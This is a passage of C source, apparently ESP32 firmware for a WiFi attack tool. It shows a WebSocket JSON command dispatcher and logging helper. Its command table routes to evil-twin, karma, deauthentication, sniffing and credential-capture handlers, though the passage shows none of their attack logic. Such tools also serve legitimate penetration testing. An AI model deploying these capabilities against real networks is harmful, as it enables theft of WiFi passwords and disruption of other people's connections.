    cJSON_AddStringToObject(root, "type", "port_scan_result");
    cJSON_AddNumberToObject(root, "status_code", scan_res); 

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static const api_cmd_t api_cmd_list[] = {
    { API_GET_STATUS, api_get_status },
    { API_SET_AP_SETTINGS, api_admin_set_ap_settings },
    { API_GET_AP_SETTINGS, api_admin_get_ap_settings },
    { API_WIFI_SCAN, api_wifi_scan },
    { API_START_EVILTWIN, api_start_evil_twin },
    { API_STOP_EVILTWIN, api_stop_evil_twin },
    { API_GET_EVILTWIN_TARGET, api_get_evlitwin_target },
    { API_CHECK_INPUT_PASSWORD, api_check_input_password },
    { API_GET_PASSWORDS, api_get_passwords },
    { API_KARMA_ATTACK_SCAN, api_karma_scan },
    { API_GET_KARMA_PROBES, api_get_karma_probes },
    { API_KARMA_ATTACK_START, api_karma_set_target },
    { API_DEAUTHER_START, api_deauther_start },
    { API_DEAUTHER_STOP, api_deauther_stop },
    { API_START_RAW_SNIFFER, api_start_raw_sniffer },
    { API_STOP_RAW_SNIFFER, api_stop_raw_sniffer },
    { API_GET_RECON_AP_LIST, api_get_recon_data_aps },
    { API_GET_RECON_CLIENT_LIST, api_get_recon_data_clients },
    { API_WIFI_CONNECT, api_wifi_connect },
    { API_WIFI_DISCONNECT, api_wifi_disconnect },
    { API_DOWNLOAD_HANDSHAKE, api_download_handshake },
    { API_START_PACKET_ANALYZER, api_start_packet_analyzer },
    { API_STOP_PACKET_ANALYZER, api_stop_packet_analyzer },
    { API_GET_LAST_WIFI_CREDENTIALS, api_get_wifi_last_credentials },
    { API_HOST_DISCOVERY, api_start_host_scan },
    { API_PORT_SCAN, api_start_port_scan_single }
};


void http_api_parse(ws_frame_req_t *req)
{
    cJSON *root = cJSON_Parse(req->payload);
    if (root == NULL) {
        ESP_LOGD(TAG, "Invalid JSON received: %s", req->payload);
        return;
    }

    cJSON *jcmd = cJSON_GetObjectItemCaseSensitive(root, "cmd");
    if (!cJSON_IsNumber(jcmd)) {
        ESP_LOGE(TAG, "Missing/invalid cmd");
        cJSON_Delete(root);
        return;
    }

    cJSON *jid = cJSON_GetObjectItemCaseSensitive(root, "req_id");
    if (cJSON_IsNumber(jid)) {
        req->req_id = jid->valueint; 
    } else {
        req->req_id = 0;
    }

    int cmd = jcmd->valueint;
    bool handled = false;
    for (size_t i = 0; i < sizeof(api_cmd_list) / sizeof(api_cmd_t); i++) {
        if (api_cmd_list[i].cmd == cmd) {
            api_cmd_list[i].handler(req);
            handled = true;
            break;
        }
    }

    if (!handled) {
        ESP_LOGW(TAG, "Unknown command: %d", cmd);
        api_send_status_frame(req, "error", "Unknown command");
    }

    cJSON_Delete(root);
}


void ws_log(const char *level, const char *format, ...)
{
    char buffer[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddStringToObject(root, "type", "log");
    cJSON_AddStringToObject(root, "level", level);
    cJSON_AddStringToObject(root, "msg", buffer);
    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = get_web_server_handle(); 
    cmd.fd = -1; //BROADCAST
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_broadcast_to_queue(&cmd) != ESP_OK) {
        cJSON_free(payload);
    }
}